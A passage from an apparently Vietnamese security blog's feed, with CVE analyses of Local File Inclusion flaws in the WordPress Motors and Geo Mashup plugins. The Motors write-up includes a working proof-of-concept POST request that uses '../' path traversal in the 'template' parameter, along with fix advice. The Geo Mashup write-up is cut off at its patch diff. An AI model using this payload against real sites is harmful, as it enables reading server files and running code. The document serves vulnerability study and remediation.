debugger:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/debug1.png&#34;&#xA;    alt=&#34;Debugger ƒëi qua c√°c logic l·∫•y post&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger ƒëi qua c√°c logic l·∫•y post&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Ta th·∫•y r·∫±ng v·ªõi c√°c &lt;strong&gt;tham s·ªë m·∫∑c ƒë·ªãnh&lt;/strong&gt; do plugin g·ª≠i l√™n, ƒëi·ªÅu ki·ªán &lt;code&gt;$listings_query-&amp;gt;have_posts()&lt;/code&gt; lu√¥n &lt;strong&gt;true&lt;/strong&gt;, n√™n action hook &lt;code&gt;stm_listings_load_template&lt;/code&gt; ƒë∆∞·ª£c g·ªçi v√† ph·∫ßn x·ª≠ l√Ω li√™n quan ƒë·∫øn &lt;code&gt;$template&lt;/code&gt; ƒë∆∞·ª£c th·ª±c thi.&lt;/p&gt;&#xA;&lt;p&gt;Hook &lt;code&gt;stm_listings_load_template&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω v·ªõi callback c√πng t√™n:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function stm_listings_load_template( $__template, $__vars = array() ) {&#xA;&#x9;extract( $__vars );&#xA;&#x9;include stm_listings_locate_template( $__template );&#xA;}&#xA;add_action( &amp;#39;stm_listings_load_template&amp;#39;, &amp;#39;stm_listings_load_template&amp;#39;, 10, 2 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;include&lt;/code&gt; l√† m·ªôt trong nh·ªØng sink g√¢y &lt;strong&gt;LFI&lt;/strong&gt; trong WordPress, ta ph√¢n t√≠ch &lt;code&gt;stm_listings_locate_template()&lt;/code&gt; ƒë·ªÉ xem gi√° tr·ªã th·ª±c s·ª± ƒë∆∞·ª£c &lt;code&gt;include&lt;/code&gt; l√† g√¨ =&amp;gt; gi√∫p t√πy ch·ªânh payload cho ph√π h·ª£p&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function stm_listings_locate_template( $templates ) {&#xA;&#x9;$located = false;&#xA;&#xA;&#x9;foreach ( (array) $templates as $template ) {&#xA;&#x9;&#x9;if ( substr( $template, - 4 ) !== &amp;#39;.php&amp;#39; ) {&#xA;&#x9;&#x9;&#x9;$template .= &amp;#39;.php&amp;#39;;&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;if ( str_contains( $template, &amp;#39;partials/&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;$located = locate_template( $template );&#xA;&#x9;&#x9;} else {&#xA;&#x9;&#x9;&#x9;$located = locate_template( &amp;#39;listings/&amp;#39; . $template );&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;if ( ! ( $located ) ) {&#xA;&#x9;&#x9;&#x9;if ( file_exists( realpath( apply_filters( &amp;#39;stm_listings_template_file&amp;#39;, STM_LISTINGS_PATH, $template ) . &amp;#39;/templates/&amp;#39; . $template ) ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$located = realpath( apply_filters( &amp;#39;stm_listings_template_file&amp;#39;, STM_LISTINGS_PATH, $template ) . &amp;#39;/templates/&amp;#39; . $template );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;if ( file_exists( $located ) ) {&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;return apply_filters( &amp;#39;stm_listings_locate_template&amp;#39;, $located, $templates );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;stm_listings_locate_template()&lt;/code&gt; nh·∫≠n tham s·ªë &lt;code&gt;$templates&lt;/code&gt;, √©p ki·ªÉu v·ªÅ m·∫£ng r·ªìi &lt;strong&gt;duy·ªát qua t·ª´ng ph·∫ßn t·ª≠&lt;/strong&gt; ƒë·ªÉ x√°c ƒë·ªãnh ƒë∆∞·ªùng d·∫´n file template h·ª£p l·ªá c·∫ßn n·∫°p.&lt;/p&gt;&#xA;&lt;p&gt;C·ª• th·ªÉ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu ph·∫ßn t·ª≠ kh√¥ng c√≥ h·∫≠u t·ªë &lt;code&gt;.php&lt;/code&gt;, h√†m s·∫Ω t·ª± ƒë·ªông n·ªëi th√™m.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu ƒë∆∞·ªùng d·∫´n ch·ª©a chu·ªói &lt;code&gt;&#39;partials/&#39;&lt;/code&gt;, n√≥ g·ªçi &lt;code&gt;locate_template( $template )&lt;/code&gt; g√°n gi√° tr·ªã tr·∫£ v·ªÅ cho &lt;code&gt;$located&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ng∆∞·ª£c l·∫°i, n√≥ t√¨m trong th∆∞ m·ª•c &lt;code&gt;&#39;listings/&#39;&lt;/code&gt; v√† g√°n gi√° tr·ªã tr·∫£ v·ªÅ cho &lt;code&gt;$located&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu v·∫´n kh√¥ng t√¨m th·∫•y, h√†m th·ª≠ ki·ªÉm tra tr·ª±c ti·∫øp trong plugin b·∫±ng c√°ch gh√©p:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;STM_LISTINGS_PATH . &amp;#39;/templates/&amp;#39; . $template&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Khi ph√°t hi·ªán file t·ªìn t·∫°i (&lt;code&gt;file_exists()&lt;/code&gt;), v√≤ng l·∫∑p d·ª´ng l·∫°i v√† tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n ƒë√≥.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/locate_template/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;locate_template()&lt;/code&gt;&lt;/a&gt; l√† h√†m &lt;strong&gt;core c·ªßa WordPress&lt;/strong&gt;. N√≥ t√¨m file template trong theme hi·ªán t·∫°i ho·∫∑c child theme. N·∫øu t√¨m th·∫•y, n√≥ tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n ƒë·∫ßy ƒë·ªß ƒë·∫øn file, c√≤n kh√¥ng th√¨ tr·∫£ v·ªÅ chu·ªói r·ªóng. =&amp;gt; Ta c·∫ßn truy·ªÅn file t·ªìn t·∫°i.&lt;/p&gt;&#xA;&lt;p&gt;üëâ K·∫øt qu·∫£ cu·ªëi c√πng ƒë∆∞·ª£c tr·∫£ v·ªÅ qua filter &lt;code&gt;stm_listings_locate_template&lt;/code&gt; v·ªõi ƒë∆∞·ªùng d·∫´n l√† &lt;code&gt;$locate&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/search1.png&#34;&#xA;    alt=&#34;Kh√¥ng c√≥ filter stm_listings_locate_template ƒë∆∞·ª£c ƒëƒÉng k√Ω&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kh√¥ng c√≥ filter &lt;code&gt;stm_listings_locate_template&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Khi t√¨m v·ªõi t·ª´ kh√≥a &lt;code&gt;stm_listings_locate_template&lt;/code&gt; trong ph·∫°m vi plugin, t√¥i kh√¥ng th·∫•y filter n√†o ƒë∆∞·ª£c ƒëƒÉng k√Ω =&amp;gt; &lt;code&gt;$locate&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c tr·∫£ v·ªÅ m√† kh√¥ng c√≥ thay ƒë·ªïi do filter.&lt;/p&gt;&#xA;&lt;p&gt;Nh∆∞ v·∫≠y ƒëi·ªÅu ki·ªán c·∫ßn ƒë·ªÉ khai th√°c bao g·ªìm:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;template&lt;/code&gt; param ch·ª©a &lt;code&gt;partials/&lt;/code&gt; ho·∫∑c &lt;code&gt;listings/&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;../&lt;/code&gt; v·ª´a ƒë·ªß ƒë·ªÉ &lt;code&gt;locate_template()&lt;/code&gt; trong tr·∫£ v·ªÅ chu·ªói r·ªóng v√† &lt;code&gt;include&lt;/code&gt; kh√¥ng l·ªói n·∫øu ƒë∆∞·ªùng d·∫´n kh√¥ng t·ªìn t·∫°i&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Th√™m code tr·∫£ v·ªÅ trong &lt;code&gt;wp-config.php&lt;/code&gt; ƒë·ªÉ th·ª≠ nghi·ªám&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;echo &amp;#34;payload&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;G·ª≠i POST request ch·ª©a LFI payload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#xA;Accept: application/json, text/javascript, */*; q=0.01&#xA;Accept-Language: vi,en-US;q=0.7,en;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#xA;X-Requested-With: XMLHttpRequest&#xA;Content-Length: 123&#xA;Origin: http://localhost&#xA;Connection: keep-alive&#xA;Referer: http://localhost/&#xA;Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; stm_car_watched=2520&#xA;Sec-Fetch-Dest: empty&#xA;Sec-Fetch-Mode: cors&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: cyan&#xA;&#xA;action=grid_tabs_widget&amp;amp;tab_type=popular&amp;amp;per_page=8&amp;amp;template=/partials/../../../../../payload&amp;amp;img_size=&amp;amp;security=d15dd83890&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/result.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ LFI th√†nh c√¥ng&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ LFI th√†nh c√¥ng&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-32654 l√† m·ªôt &lt;strong&gt;LFI&lt;/strong&gt; trong plugin &lt;strong&gt;Motors ‚â§1.4.71&lt;/strong&gt;: tham s·ªë &lt;code&gt;template&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c r√†ng bu·ªôc, cho ph√©p path traversal v√† &lt;code&gt;include()&lt;/code&gt; file b·∫•t k·ª≥. Endpoint c√¥ng khai (&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt;) v√† nonce xu·∫•t tr√™n front‚Äëend gi√∫p k·∫ª t·∫•n c√¥ng d·ªÖ khai th√°c. L·ªó h·ªïng ƒë∆∞·ª£c v√° trong &lt;strong&gt;v1.4.72&lt;/strong&gt; b·∫±ng c√°ch chu·∫©n ho√° t√™n file v√† ki·ªÉm tra &lt;strong&gt;whitelist&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng d√πng input th√¥ ƒë·ªÉ build ƒë∆∞·ªùng d·∫´n cho &lt;code&gt;include&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;∆Øu ti√™n &lt;strong&gt;whitelist&lt;/strong&gt; template/ƒë∆∞·ªùng d·∫´n h·ª£p l·ªá.&lt;/li&gt;&#xA;&lt;li&gt;Chu·∫©n ho√° (e.g. &lt;code&gt;sanitize_file_name()&lt;/code&gt;/&lt;code&gt;sanitize_key()&lt;/code&gt;), d√πng &lt;code&gt;realpath()&lt;/code&gt; ƒë·ªÉ so s√°nh v·ªõi th∆∞ m·ª•c g·ªëc.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu endpoint ph·∫£i c√¥ng khai, b·∫Øt bu·ªôc ki·ªÉm so√°t ch·∫∑t input ch·ª© ƒë·ª´ng ch·ªâ tr√¥ng v√†o nonce.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/motors-car-dealership-classified-listings/vulnerability/wordpress-motors-plugin-1-4-65-local-file-inclusion-vulnerability-2?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Motors Plugin &amp;lt;= 1.4.71 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48293 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-13-cve-2025-48293/</link>
      <pubDate>Mon, 13 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-13-cve-2025-48293/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-13-cve-2025-48293/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Geo Mashup&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;‚â§ 1.13.16&lt;/strong&gt; ch·ª©a l·ªó h·ªïng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh &lt;code&gt;include/require&lt;/code&gt;, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48293&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48293&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.13.16&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.13.17&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/geo-mashup/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Geo Mashup Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Geo Mashup&lt;/strong&gt;: &lt;strong&gt;1.13.16&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;1.13.17&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 